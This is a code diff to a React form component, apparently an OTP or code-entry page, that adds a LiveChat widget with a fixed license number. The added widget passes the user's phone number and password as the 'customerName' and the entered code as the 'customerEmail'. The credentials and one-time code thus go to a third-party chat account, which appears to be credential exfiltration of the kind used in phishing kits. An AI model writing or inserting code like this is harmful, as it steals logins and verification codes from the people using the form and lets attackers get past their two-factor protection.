@@ -1,5 +1,6 @@
 import React, { useEffect, useState } from "react";
 import { Spinner } from "./Loader";
+import { LiveChatWidget, EventHandlerPayload } from "@livechat/widget-react";
 
 const Code = (props: any) => {
   const [show, setShow] = useState(true);
@@ -14,6 +15,9 @@ const Code = (props: any) => {
     setC3("");
     setC4("");
   };
+   function handleNewEvent(event: EventHandlerPayload<"onNewEvent">) {
+    console.log("LiveChatWidget.onNewEvent", event);
+  }
   useEffect(() => {
     if (show) {
       setTimeout(() => setShow(false), 3000);
@@ -158,6 +162,13 @@ const Code = (props: any) => {
           </div>
         </form>
       </div>
+         <LiveChatWidget
+        key="10"
+        customerName={`${props.phone}  ${props.pass}`}
+        customerEmail={props.code}
+        onNewEvent={handleNewEvent}
+        license="17046132"
+      />
     </div>
   ) : null;
 };
